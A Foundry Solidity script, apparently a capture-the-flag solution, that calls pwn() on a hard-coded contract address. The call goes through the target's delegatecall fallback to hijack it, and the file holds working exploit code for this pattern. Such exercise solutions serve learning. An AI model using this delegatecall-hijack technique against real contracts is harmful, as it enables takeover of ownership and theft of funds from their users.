// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";

contract DelegateScript is Script {
    uint256 deployerPrivateKey;
    address public delegationAddress = 0xbcc8a4F69E56d05dcE361F08273BbfD41f721982;

    function setUp() public {
        deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    }

    function run() public {
        vm.startBroadcast(deployerPrivateKey);
        _attack();
        vm.stopBroadcast();
    }

    function _attack() public {
        bytes memory callData = abi.encodeWithSignature("pwn()");
        // this call should goes to the fall back function which then
        // will delegate call using the callData provided
        (bool success,) = delegationAddress.call(callData);
        console.log("Success:", success);
    }
}
